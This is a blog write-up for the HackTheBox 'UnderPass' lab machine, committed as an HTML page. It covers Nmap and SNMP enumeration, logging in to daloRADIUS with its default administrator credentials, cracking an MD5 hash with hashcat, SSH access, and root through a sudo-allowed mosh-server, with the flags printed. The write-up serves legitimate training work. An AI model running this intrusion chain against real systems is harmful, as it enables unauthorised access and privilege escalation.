@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html 
+  lang="en" 
+  dir="ltr">
+
+<head>
+  <link rel="icon" href="https://machiavelli.me/icons/favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="https://machiavelli.me/icons/favicon.ico" type="image/x-icon">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  
+  
+  <meta name="description" content="|_337 |-|4&gt;&lt;0R?" />
+  
+  
+
+  <title>
+    
+    HackTheBox | UnderPass
+    
+</title>
+  <link rel="alternate" type="application/atom+xml" title="Machiavelli&#x27;s Homepage Atom Feed" href="https://machiavelli.me/atom.xml" />
+
+  
+  <link rel="stylesheet" href="https://machiavelli.me/site.css">
+  
+
+  
+  
+</head>
+
+<body class="hack dark main container">
+  
+    
+        
+  
+  <header class="nav-header">
+    <nav itemscope itemtype="http://schema.org/SiteNavigationElement" class="navbar">
+      <div class="nav-links">
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me">
+          <span itemprop="name">Home</span></a>
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me/rquotes">
+          <span itemprop="name">rquotes</span></a>
+        
+        <a itemprop="url"
+          class=""
+          href="https://machiavelli.me/lolbas">
+          <span itemprop="name">lolbas</span></a>
+        
+      </div>
+    </nav>
+    
+    <div class="search-container">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" class="search-icon">
+        <path stroke-linecap="round" stroke-linejoin="round"
+          d="m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607Z" />
+      </svg>
+      <input type="text" id="search" placeholder="Search...">
+      <div class="search-results">
+        <div class="search-results__items"></div>
+      </div>
+    </div>
+    
+
+  </header>
+  
+  
+    
+
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+        <h1 itemprop="headline">HackTheBox | UnderPass</h1>
+        <span class="muted">
+    <svg class="icon i-clock" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <circle cx="16" cy="16" r="14"/>
+        <path d="M16 8 L16 16 20 20"/>
+    </svg>
+    <span>2 minute read</span>
+    <svg class="icon i-edit" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
+    </svg>
+
+    Published: 2025-05-10
+</span>
+    </header>
+        
+        <nav aria-label="Table of contents">
+        <details>
+            <summary role="button" style="padding: 0rem 0rem 0rem 0rem;margin: 1rem 0rem 1.5rem 0rem;">
+            Table of Contents
+            <br>
+            </summary>
+            <ul>
+            
+                <li>
+                <a href="https://machiavelli.me/htb-underpass/#initial-foothold">Initial Foothold</a>
+                
+                </li>
+            
+                <li>
+                <a href="https://machiavelli.me/htb-underpass/#privilege-escalation">Privilege Escalation</a>
+                
+                </li>
+            
+            </ul>
+        </details>
+        </nav>
+
+
+    <div itemprop="articleBody">
+      <p>HackTheBox UnderPass easy box write-up.</p>
+<span id="continue-reading"></span>
+<p><strong>Originally published on Medium on December 22, 2024.</strong></p>
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;htb-underpass&#x2F;assets/images/UnderPass.png" 
+      alt="info card" 
+      style="
+        max-width: 100%; 
+        height: auto; 
+        display: block; 
+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div><h2 id="initial-foothold">Initial Foothold</h2>
+<p>As usual, we begin with <strong>Nmap</strong> scan.</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;"># Nmap 7.94SVN scan initiated Sun Dec 22 09:37:19 2024 as: nmap -sS -p- -sC -sV -Pn --min-rate 500 -oN mainScan 10.10.11.48
+</span><span style="color:#abb2bf;">Nmap scan report for 10.10.11.48
+</span><span style="color:#abb2bf;">Host is up (0.66s latency).
+</span><span style="color:#abb2bf;">Not shown: 65533 closed tcp ports (reset)
+</span><span style="color:#abb2bf;">PORT   STATE SERVICE VERSION
+</span><span style="color:#abb2bf;">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+</span><span style="color:#abb2bf;">| ssh-hostkey:
+</span><span style="color:#abb2bf;">|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
+</span><span style="color:#abb2bf;">|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
+</span><span style="color:#abb2bf;">80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+</span><span style="color:#abb2bf;">|_http-title: Apache2 Ubuntu Default Page: It works
+</span><span style="color:#abb2bf;">|_http-server-header: Apache/2.4.52 (Ubuntu)
+</span><span style="color:#abb2bf;">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelba
+</span></code></pre>
+<p>I was stuck for more than an hour with the web application because I thought as usual for easy boxes it would be a vulnerable version of an application or something that was not complicated, so in these cases, I returned to recon again and initiated a UDP scan:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;"># Nmap 7.94SVN scan initiated Sun Dec 22 10:28:39 2024 as: nmap -sU -p- --min-rate 500 -oN mainUDPScan underpass.htb
+</span><span style="color:#abb2bf;">Warning: 10.10.11.48 giving up on port because retransmission cap hit (10).
+</span><span style="color:#abb2bf;">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+</span><span style="color:#abb2bf;">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+</span><span style="color:#abb2bf;">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+</span><span style="color:#abb2bf;">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+</span><span style="color:#abb2bf;">Nmap scan report for underpass.htb (10.10.11.48)
+</span><span style="color:#abb2bf;">Host is up (1.5s latency).
+</span><span style="color:#abb2bf;">Not shown: 64155 open|filtered udp ports (no-response), 1379 closed udp ports (port-unreach)
+</span><span style="color:#abb2bf;">PORT    STATE SERVICE
+</span><span style="color:#abb2bf;">161/udp open  snmp
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;"># Nmap done at Sun Dec 22 10:52:44 2024 -- 1 IP address (1 host up) scanned in 1444.89 seconds
+</span></code></pre>
+<p>Let's keep enumerating with <strong>NSE</strong>:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;"># Nmap 7.94SVN scan initiated Sun Dec 22 10:54:56 2024 as: nmap -sU -p 161 --script=snmp* --min-rate 500 -oN mainSNMPScan underpass.htb
+</span><span style="color:#abb2bf;">Nmap scan report for underpass.htb (10.10.11.48)
+</span><span style="color:#abb2bf;">Host is up (0.13s latency).
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">PORT    STATE SERVICE
+</span><span style="color:#abb2bf;">161/udp open  snmp
+</span><span style="color:#abb2bf;">| snmp-info:
+</span><span style="color:#abb2bf;">|   enterprise: net-snmp
+</span><span style="color:#abb2bf;">|   engineIDFormat: unknown
+</span><span style="color:#abb2bf;">|   engineIDData: c7ad5c4856d1cf6600000000
+</span><span style="color:#abb2bf;">|   snmpEngineBoots: 29
+</span><span style="color:#abb2bf;">|_  snmpEngineTime: 48m47s
+</span><span style="color:#abb2bf;">| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
+</span><span style="color:#abb2bf;">|_  System uptime: 48m50.75s (293075 timeticks)
+</span><span style="color:#abb2bf;">| snmp-brute:
+</span><span style="color:#abb2bf;">|_  public - Valid credentials
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;"># Nmap done at Sun Dec 22 10:55:17 2024 -- 1 IP address (1 host up) scanned in 20.60 seconds
+</span></code></pre>
+<p>No, it's not enough, keep enumerating using <strong>snmpbulkwalk</strong>.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">root@machiavelli:~#</span><span style="color:#abb2bf;"> snmpbulkwalk</span><span style="color:#eb6772;"> -c</span><span style="color:#abb2bf;"> public</span><span style="color:#eb6772;"> -v2c</span><span style="color:#abb2bf;"> underpass.htb
+</span><span style="color:#eb6772;">iso.3.6.1.2.1.1.1.0</span><span style="color:#abb2bf;"> = STRING: </span><span style="color:#9acc76;">&quot;Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64&quot;
+</span><span style="color:#eb6772;">iso.3.6.1.2.1.1.2.0</span><span style="color:#abb2bf;"> = OID: iso.3.6.1.4.1.8072.3.2.10
+</span><span style="color:#eb6772;">iso.3.6.1.2.1.1.3.0</span><span style="color:#abb2bf;"> = Timeticks: (304411) </span><span style="color:#eb6772;">0:50:44.11
+</span><span style="color:#eb6772;">iso.3.6.1.2.1.1.4.0</span><span style="color:#abb2bf;"> = STRING: </span><span style="color:#9acc76;">&quot;steve@underpass.htb&quot;
+</span><span style="color:#eb6772;">iso.3.6.1.2.1.1.5.0</span><span style="color:#abb2bf;"> = STRING: </span><span style="color:#9acc76;">&quot;UnDerPass.htb is the only daloradius server in the basin!&quot;
+</span><span style="color:#eb6772;">iso.3.6.1.2.1.1.6.0</span><span style="color:#abb2bf;"> = STRING: </span><span style="color:#9acc76;">&quot;Nevada, U.S.A. but not Vegas&quot;
+</span><span style="color:#eb6772;">iso.3.6.1.2.1.1.7.0</span><span style="color:#abb2bf;"> = INTEGER: 72
+</span><span style="color:#eb6772;">iso.3.6.1.2.1.1.8.0</span><span style="color:#abb2bf;"> = Timeticks: (0) </span><span style="color:#eb6772;">0:00:00.00
+</span><span style="color:#eb6772;">iso.3.6.1.2.1.1.9.1.2.1</span><span style="color:#abb2bf;"> = OID: iso.3.6.1.6.3.10.3.1.1
+</span><span style="color:#eb6772;">iso.3.6.1.2.1.1.9.1.2.2</span><span style="color:#abb2bf;"> = OID: iso.3.6.1.6.3.11.3.1.1
+</span><span style="color:#eb6772;">iso.3.6.1.2.1.1.9.1.2.3</span><span style="color:#abb2bf;"> = OID: iso.3.6.1.6.3.15.2.1.1
+</span></code></pre>
+<p>The <strong>STRINGS</strong> <code>steve@underpass.htb</code> and <code>UnDerPass.htb is the only daloradius server in the basin!</code> are pretty interesting, after some googling about <a href="https://github.com/lirantal/daloradius">daloradius server</a> we discovered that we can log in to through <code>http://underpass.htb/daloradius/app/operators/login.php</code> with the default credentials:</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">Username: administrator
+</span><span style="color:#abb2bf;">Password: radius
+</span></code></pre>
+<p>The credentials are valid!
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;htb-underpass&#x2F;assets/images/Home.png" 
+      alt="home page" 
+      style="
+        max-width: 100%; 
+        height: auto; 
+        display: block; 
+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div></p>
+<p>The <code>users list</code> looks good, let's check it.
+We found an MD5 hashed password and a username.</p>
+<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
+    <img 
+      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;htb-underpass&#x2F;assets/images/UsersList.png" 
+      alt="users list" 
+      style="
+        max-width: 100%; 
+        height: auto; 
+        display: block; 
+        margin: 0 auto; 
+        border-radius: 8px; 
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+      "
+      loading="lazy"
+    >
+    
+  </div>
+<p>Cracking the password using <strong>john</strong> or <strong>hashcat</strong>, I'll go with <strong>hashcat</strong>.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">root@machiavelli:~#</span><span style="color:#abb2bf;"> hashcat</span><span style="color:#eb6772;"> -m</span><span style="color:#abb2bf;"> 0 UserHash /usr/share/wordlists/rockyou.txt
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">UserHash:crackedPassword
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">Session..........:</span><span style="color:#abb2bf;"> hashcat
+</span><span style="color:#eb6772;">Status...........:</span><span style="color:#abb2bf;"> Cracked
+</span><span style="color:#eb6772;">Hash.Mode........:</span><span style="color:#abb2bf;"> 0 (MD5)
+</span><span style="color:#eb6772;">Hash.Target......:</span><span style="color:#abb2bf;"> UserHash
+</span><span style="color:#eb6772;">Time.Started.....:</span><span style="color:#abb2bf;"> Sun Dec 22 11:14:32 2024 (2 secs)
+</span><span style="color:#eb6772;">Time.Estimated...:</span><span style="color:#abb2bf;"> Sun Dec 22 11:14:34 2024 (0 secs)
+</span><span style="color:#eb6772;">Kernel.Feature...:</span><span style="color:#abb2bf;"> Pure Kernel
+</span><span style="color:#eb6772;">Guess.Base.......:</span><span style="color:#abb2bf;"> File (/usr/share/wordlists/rockyou.txt)
+</span><span style="color:#eb6772;">Guess.Queue......:</span><span style="color:#abb2bf;"> 1/1 (100.00%)
+</span><span style="color:#eb6772;">Speed.#1.........:</span><span style="color:#abb2bf;">  2749.2 kH/s (0.14ms) </span><span style="color:#eb6772;">@</span><span style="color:#abb2bf;"> Accel:512 Loops:1 Thr:1 Vec:8
+</span><span style="color:#eb6772;">Recovered........:</span><span style="color:#abb2bf;"> 1/1 (100.00%) </span><span style="color:#eb6772;">Digests</span><span style="color:#abb2bf;"> (total)</span><span style="color:#eb6772;">,</span><span style="color:#abb2bf;"> 1/1 (100.00%) </span><span style="color:#eb6772;">Digests</span><span style="color:#abb2bf;"> (new)
+</span><span style="color:#eb6772;">Progress.........:</span><span style="color:#abb2bf;"> 2985984/14344385 (20.82%)
+</span><span style="color:#eb6772;">Rejected.........:</span><span style="color:#abb2bf;"> 0/2985984 (0.00%)
+</span><span style="color:#eb6772;">Restore.Point....:</span><span style="color:#abb2bf;"> 2983936/14344385 (20.80%)
+</span><span style="color:#eb6772;">Restore.Sub.#1...:</span><span style="color:#abb2bf;"> Salt:0 Amplifier:0-1 Iteration:0-1
+</span><span style="color:#eb6772;">Candidate.Engine.:</span><span style="color:#abb2bf;"> Device Generator
+</span><span style="color:#eb6772;">Candidates.#1....:</span><span style="color:#abb2bf;"> underwear63 -</span><span style="color:#adb7c9;">&gt;</span><span style="color:#abb2bf;"> unc112886
+</span><span style="color:#eb6772;">Hardware.Mon.#1..:</span><span style="color:#abb2bf;"> Util: 43%
+</span></code></pre>
+<p>Then we can use the username with the cracked password to connect over SSH and capture the user.txt:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">root@machiavelli:~#</span><span style="color:#abb2bf;"> ssh svcMosh@underpass.htb
+</span><span style="color:#eb6772;">svcMosh@underpass.htb</span><span style="color:#9acc76;">&#39;s password:
+</span><span style="color:#9acc76;">Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;"> * Documentation:  https://help.ubuntu.com
+</span><span style="color:#9acc76;"> * Management:     https://landscape.canonical.com
+</span><span style="color:#9acc76;"> * Support:        https://ubuntu.com/pro
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;"> System information as of Sun Dec 22 06:25:00 PM UTC 2024
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">  System load:  0.0               Processes:             329
+</span><span style="color:#9acc76;">  Usage of /:   95.9% of 3.75GB   Users logged in:       1
+</span><span style="color:#9acc76;">  Memory usage: 20%               IPv4 address for eth0: 10.10.11.48
+</span><span style="color:#9acc76;">  Swap usage:   0%
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">  =&gt; / is using 95.9% of 3.75GB
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">Expanded Security Maintenance for Applications is not enabled.
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">0 updates can be applied immediately.
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">Enable ESM Apps to receive additional future security updates.
+</span><span style="color:#9acc76;">See https://ubuntu.com/esm or run: sudo pro status
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">Last login: Sun Dec 22 17:40:45 2024 from 10.10.16.18
+</span><span style="color:#9acc76;">svcMosh@underpass:~$ ls
+</span><span style="color:#9acc76;">user.txt
+</span><span style="color:#9acc76;">svcMosh@underpass:~$ cat user.txt
+</span><span style="color:#9acc76;">e918adf7ea4b7b3d6b4bc53486f3f81a
+</span></code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>The first thing we check while trying to escalate our privileges is <code>sudo -l</code>:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">svcMosh@underpass:~$</span><span style="color:#abb2bf;"> sudo</span><span style="color:#eb6772;"> -l
+</span><span style="color:#eb6772;">Matching</span><span style="color:#abb2bf;"> Defaults entries for svcMosh on localhost:
+</span><span style="color:#abb2bf;">    </span><span style="color:#eb6772;">env_reset,</span><span style="color:#abb2bf;"> mail_badpass, secure_path=/usr/local/sbin</span><span style="color:#5ebfcc;">\:</span><span style="color:#abb2bf;">/usr/local/bin</span><span style="color:#5ebfcc;">\:</span><span style="color:#abb2bf;">/usr/sbin</span><span style="color:#5ebfcc;">\:</span><span style="color:#abb2bf;">/usr/bin</span><span style="color:#5ebfcc;">\:</span><span style="color:#abb2bf;">/sbin</span><span style="color:#5ebfcc;">\:</span><span style="color:#abb2bf;">/bin</span><span style="color:#5ebfcc;">\:</span><span style="color:#abb2bf;">/snap/bin, use_pty
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">User</span><span style="color:#abb2bf;"> svcMosh may run the following commands on localhost:
+</span><span style="color:#abb2bf;">    (</span><span style="color:#eb6772;">ALL</span><span style="color:#abb2bf;">) NOPASSWD: /usr/bin/mosh-server
+</span><span style="color:#eb6772;">svcMosh@underpass:~$
+</span></code></pre>
+<p>When it's your first time facing a new command or service, reading the manual is a good thing:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">svcMosh@underpass:~$</span><span style="color:#abb2bf;"> man /usr/bin/mosh-server
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">***
+</span><span style="color:#eb6772;">DESCRIPTION
+</span><span style="color:#abb2bf;">       </span><span style="color:#eb6772;">mosh-server</span><span style="color:#abb2bf;"> is a helper program for the mosh(1) </span><span style="color:#eb6772;">remote</span><span style="color:#abb2bf;"> terminal application.
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">       </span><span style="color:#eb6772;">mosh-server</span><span style="color:#abb2bf;"> binds to a high UDP port and chooses an encryption key to protect the session. It prints both on standard output, detaches from the terminal, and waits for the mosh-client to establish a connection. It will exit if no client has contacted it within 60 seconds.
+</span><span style="color:#eb6772;">***
+</span></code></pre>
+<p>Reading the examples will guide you, let's capture the root.txt.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">svcMosh@underpass:~$</span><span style="color:#abb2bf;"> sudo /usr/bin/mosh-server new</span><span style="color:#eb6772;"> -p</span><span style="color:#abb2bf;"> 61113
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">MOSH</span><span style="color:#abb2bf;"> CONNECT 61113 QzOh2gOWZ3672OIDhszC0A
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">mosh-server</span><span style="color:#abb2bf;"> (mosh 1.3.2) </span><span style="color:#eb6772;">[build</span><span style="color:#abb2bf;"> mosh 1.3.2]
+</span><span style="color:#eb6772;">Copyright</span><span style="color:#abb2bf;"> 2012 Keith Winstein </span><span style="color:#adb7c9;">&lt;</span><span style="color:#abb2bf;">mosh-devel@mit.edu</span><span style="color:#adb7c9;">&gt;
+</span><span style="color:#eb6772;">License</span><span style="color:#abb2bf;"> GPLv3+: GNU GPL version 3 or later </span><span style="color:#adb7c9;">&lt;</span><span style="color:#abb2bf;">http://gnu.org/licenses/gpl.html</span><span style="color:#adb7c9;">&gt;</span><span style="color:#abb2bf;">.
+</span><span style="color:#eb6772;">This</span><span style="color:#abb2bf;"> is free software: you are free to change and redistribute it.
+</span><span style="color:#eb6772;">There</span><span style="color:#abb2bf;"> is NO WARRANTY, to the extent permitted by law.
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">[mosh-server</span><span style="color:#abb2bf;"> detached, pid = 1897]
+</span><span style="color:#eb6772;">svcMosh@underpass:~$</span><span style="color:#abb2bf;"> MOSH_KEY=QzOh2gOWZ3672OIDhszC0A mosh-client 127.0.0.1  61113
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">Welcome</span><span style="color:#abb2bf;"> to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;"> </span><span style="color:#eb6772;">*</span><span style="color:#abb2bf;"> Documentation:  https://help.ubuntu.com
+</span><span style="color:#abb2bf;"> </span><span style="color:#eb6772;">*</span><span style="color:#abb2bf;"> Management:     https://landscape.canonical.com
+</span><span style="color:#abb2bf;"> </span><span style="color:#eb6772;">*</span><span style="color:#abb2bf;"> Support:        https://ubuntu.com/pro
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;"> </span><span style="color:#eb6772;">System</span><span style="color:#abb2bf;"> information as of Sun Dec 22 04:18:05 PM UTC 2024
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">  </span><span style="color:#eb6772;">System</span><span style="color:#abb2bf;"> load:  0.78              Processes:             336
+</span><span style="color:#abb2bf;">  </span><span style="color:#eb6772;">Usage</span><span style="color:#abb2bf;"> of /:   85.4% of 3.75GB   Users logged in:       1
+</span><span style="color:#abb2bf;">  </span><span style="color:#eb6772;">Memory</span><span style="color:#abb2bf;"> usage: 13%               IPv4 address for eth0: 10.10.11.48
+</span><span style="color:#abb2bf;">  </span><span style="color:#eb6772;">Swap</span><span style="color:#abb2bf;"> usage:   0%
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">  </span><span style="color:#adb7c9;">=&gt;</span><span style="color:#abb2bf;"> / </span><span style="color:#eb6772;">is</span><span style="color:#abb2bf;"> using 85.4% of 3.75GB
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">Expanded</span><span style="color:#abb2bf;"> Security Maintenance for Applications is not enabled.
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">0</span><span style="color:#abb2bf;"> updates can be applied immediately.
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">Enable</span><span style="color:#abb2bf;"> ESM Apps to receive additional future security updates.
+</span><span style="color:#eb6772;">See</span><span style="color:#abb2bf;"> https://ubuntu.com/esm or run: sudo pro status
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">Failed</span><span style="color:#abb2bf;"> to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">root@underpass:~#</span><span style="color:#abb2bf;"> ls
+</span><span style="color:#eb6772;">root.txt
+</span><span style="color:#eb6772;">root@underpass:~#</span><span style="color:#abb2bf;"> cat root.txt
+</span><span style="color:#eb6772;">0a6c39e93e67c280f799bdb732314b4a
+</span><span style="color:#eb6772;">root@underpass:~#
+</span></code></pre>
+<p><strong>Perfect!</strong></p>
+
+    </div>
+
+    
+        <footer>
+            <hr>
+            <p>
+                
+                    Published by Machiavelli
+                
+                
+                    
+                    in <a href="https://machiavelli.me/categories/ctf/">CTF</a>
+                
+                
+                    and
+                    tagged
+                    
+                        <a href="https://machiavelli.me/tags/ctf/">CTF</a>
+                        
+                            
+                                
+                                    and
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/hackthebox/">HackTheBox</a>
+                        
+                            
+                        
+                    
+                
+            </p>
+            
+            
+        </footer>
+    
+</article>
+
+
+
+  <!-- optional scripts -->
+  
+  
+  <script src="https://machiavelli.me/js/codeblock.js"></script>
+  
+
+  
+<!-- MathJax script for rendering LaTeX math equations -->
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"],
+      ],
+      displayMath: [
+        ["$$", "$$"],
+        ["\\[", "\\]"],
+      ],
+    },
+  };
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js" async></script>
+
+
+  
+<script type="text/javascript" src="https://machiavelli.me/elasticlunr.min.js"></script>
+<script type="text/javascript" src="https://machiavelli.me/js/search.js"></script>
+
+
+  
+</body>
+
+</html>
